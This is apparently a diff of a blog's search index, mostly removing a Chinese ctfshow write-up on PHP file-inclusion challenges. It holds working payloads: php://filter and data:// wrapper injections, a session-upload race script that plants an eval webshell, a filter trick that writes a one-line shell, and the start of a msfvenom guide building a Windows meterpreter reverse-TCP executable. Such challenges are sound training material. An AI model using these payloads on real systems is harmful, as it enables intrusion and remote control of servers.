@@ -138,138 +138,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ctfshow入门文件包含部分</title>
-    <url>/2020/12/20/%5Bctfshow%5Dweb%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<p>ctfshow web入门 文件包含部分</p>
-<a id="more"></a>
-<h2 id="web-78"><a class="header-anchor" href="#web-78">¶</a>web 78</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h2 id="web-79"><a class="header-anchor" href="#web-79">¶</a>web 79</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br></pre></td></tr></table></figure>
-<h2 id="web-80-81"><a class="header-anchor" href="#web-80-81">¶</a>web 80-81</h2>
-<p>试了试文件日志包含漏洞</p>
-<p>先抓包,发现是nginx，一般的日志路径为  <code>/var/log/nginx/access.log</code></p>
-<p>访问发现成功</p>
-<p>进行getshell  先ls (可能需要多go几次)</p>
-<p><a href="https://imgchr.com/i/sClU7n"><img src="https://s3.ax1x.com/2021/01/03/sClU7n.png" alt="sClU7n.png"></a></p>
-<p>得到flag</p>
-<p><a href="https://imgchr.com/i/sClscF"><img src="https://s3.ax1x.com/2021/01/03/sClscF.png" alt="sClscF.png"></a></p>
-<h2 id="web82-86"><a class="header-anchor" href="#web82-86">¶</a>web82-86</h2>
-<p><strong>这题是利用 session.upload_progress 包含文件漏洞</strong></p>
-<p>session.upload_progress在php5.4添加的。</p>
-<p>在php.ini有以下几个默认选项</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
-<ol>
-<li>
-<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
-</li>
-<li>
-<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
-</li>
-<li>
-<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
-<p><a href="https://imgchr.com/i/sCl27R"><img src="https://s3.ax1x.com/2021/01/03/sCl27R.png" alt="sCl27R.png"></a></p>
-</li>
-<li>
-<p><code>prefix+name</code>将表示为session中的键名</p>
-</li>
-</ol>
-<p>另外，再添加个session配置中一个重要选项。</p>
-<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</p>
-<p><strong>分析</strong></p>
-<p>如果<strong>session.auto_start=On</strong> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行<strong>session_start()</strong>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<strong>session.use_strict_mode</strong>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
-<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
-<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
-<p><strong>session文件默认存储路径</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
-<p>进入正题</p>
-<p><strong>题目源码:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">\# -*- coding: utf-8 -*-</span><br><span class="line">\# @Author: h1xa</span><br><span class="line">\# @Date:  2020-09-16 11:25:09</span><br><span class="line">\# @Last Modified by:  h1xa</span><br><span class="line">\# @Last Modified time: 2020-09-16 19:34:45</span><br><span class="line">\# @email: h1xa@ctfer.com</span><br><span class="line">\# @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">  $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">  $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">  include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>以POST的形式发包，上传的文件随意,下面是构造的上传表单</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag ，session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 所以PHP将会在服务器上创建一个文件：/tmp/sess_flag”    然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下</p>
-<p><a href="https://imgchr.com/i/sClocD"><img src="https://s3.ax1x.com/2021/01/03/sClocD.png" alt="sClocD.png"></a></p>
-<p>因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包</p>
-<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
-<p><a href="https://imgchr.com/i/sClj4P"><img src="https://s3.ax1x.com/2021/01/03/sClj4P.png" alt="sClj4P.png"></a></p>
-<p>两个包payload设置如下</p>
-<p><a href="https://imgchr.com/i/sC1SgS"><img src="https://s3.ax1x.com/2021/01/03/sC1SgS.png" alt="sC1SgS.png"></a></p>
-<p>条件竞争，将POST的包和传file的包都开启爆破，即可得到目录</p>
-<p><a href="https://imgchr.com/i/sC1PBj"><img src="https://s3.ax1x.com/2021/01/03/sC1PBj.png" alt="sC1PBj.png"></a></p>
-<p>同理也能得到flag</p>
-<p><a href="https://imgchr.com/i/sC1ZCV"><img src="https://s3.ax1x.com/2021/01/03/sC1ZCV.png" alt="sC1ZCV.png"></a></p>
-<p><strong>也可以使用python脚本</strong></p>
-<p>也直接用前面文章里的脚本：</p>
-<p>附上大佬的脚本</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(f<span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> not in response.text:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>改下url和要执行的shell即可</p>
-<p><strong>参考文章:</strong></p>
-<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
-<p><a href="https://blog.csdn.net/qq_44657899/article/details/109281343">https://blog.csdn.net/qq_44657899/article/details/109281343</a></p>
-<p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
-<h2 id="web83"><a class="header-anchor" href="#web83">¶</a>web83</h2>
-<p><strong>源码:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:28:52</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>warning提示了  ，所以表单构造需要重新构造，多了 <code>session_start();</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;668ba926-9165-49e7-92fb-c94a08d54feb.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;2333&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>web82-86用py脚本都能跑过</strong></p>
-<h2 id="web84"><a class="header-anchor" href="#web84">¶</a>web84</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:40:01</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf &#x2F;tmp&#x2F;*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web85"><a class="header-anchor" href="#web85">¶</a>web85</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:59:51</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content &#x3D; file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web86"><a class="header-anchor" href="#web86">¶</a>web86</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 21:20:43</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">define(&#39;还要秀？&#39;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="web87"><a class="header-anchor" href="#web87">¶</a>web87</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>分析源码，这题有两个传参，file和 content，然后将content参数的值写入到file参数所定义的文件里，但是一同写入的还有，在开头增加了die的过程，导致即使我们成功写入一句话，也执行不了，我们所要做的就是绕过die</p>
-<p>这里放上p神的 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1">谈一谈php://filter的妙用</a></p>
-<p>p神文章已经讲得很清楚了，base64算法解码时是4个byte一组, 而phpdie共6个字符，所以我们解码的时候需要再添加两个字符</p>
-<p><strong>payload:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php(file的内容需要进行两次url编码)</span><br><span class="line"></span><br><span class="line">content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-<p>写入一句话后，然后访问 1.php，就可以执行shell了</p>
-<p><a href="https://imgchr.com/i/sC1NvD"><img src="https://s3.ax1x.com/2021/01/03/sC1NvD.png" alt="sC1NvD.png"></a></p>
-<h2 id="web88"><a class="header-anchor" href="#web88">¶</a>web88</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-17 02:27:25</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    if(preg_match(&quot;&#x2F;php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\.&#x2F;i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>data协议绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4</span><br><span class="line"></span><br><span class="line">即 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure>
-<h2 id="其他包含小姿势"><a class="header-anchor" href="#其他包含小姿势">¶</a>其他包含小姿势</h2>
-<p>审计中可见这样的包含模版文件：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.htm&quot;</span>); <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-<ol>
-<li>%00截断<br>
-/etc/passwd%00<br>
-(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
-<li>%00截断目录遍历：<br>
-/var/www/%00<br>
-(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
-<li>路径长度截断：<br>
-/etc/passwd/././././././.[…]/./././././.<br>
-(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
-<li>点号截断：<br>
-/boot.ini/………[…]…………<br>
-(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
-</ol>
-<h3 id="php-input"><a class="header-anchor" href="#php-input">¶</a>php://input</h3>
-<p>php://input协议主要用于访问各个输入/输出流。CTF中经常使用<code>file_get_contents</code>获取php://input内容(POST)，需要开启allow_url_include，并且当<code>enctype=&quot;multipart/form-data&quot;</code>的时候 php://input是无效的。</p>
-<p><strong>利用方式：<code>?file=php://input 数据利用POST传过去</code></strong></p>
-<blockquote>
-<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</p>
-</blockquote>
-<p>假设页面源代码为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if (@file_get_content($file) &#x3D;&#x3D; &#39;meizijiu&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>直接使用Hackbar工具POST数据：</p>
-<p><a href="https://imgchr.com/i/sC1DUI"><img src="https://s3.ax1x.com/2021/01/03/sC1DUI.png" alt="sC1DUI.png"></a></p>
-<p>另外还可以写入一句话</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">post数据:</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>参考</strong>:<a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://ca0y1h.top/Web_security/basic_learning/13.文件包含漏洞利用/</a></p>
-<p><a href="https://www.cnblogs.com/NPFS/p/13797449.html">https://www.cnblogs.com/NPFS/p/13797449.html</a></p>
-]]></content>
-      <categories>
-        <category>刷题站</category>
-        <category>ctfshow</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ctfshow入门sql注入部分</title>
     <url>/2021/01/01/%5Bctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86%5D/</url>
     <content><![CDATA[<p><strong>ctfshow web入门 sql注入部分(不断更新)</strong></p>
@@ -551,20 +419,135 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
       </categories>
   </entry>
   <entry>
-    <title>msf的shell在windows中的利用</title>
-    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>msf的shell的制作</p>
+    <title>ctfshow入门文件包含部分</title>
+    <url>/2020/12/20/%5Bctfshow%5Dweb%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<p>ctfshow web入门 文件包含部分</p>
 <a id="more"></a>
-<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
-<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
-<p>输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
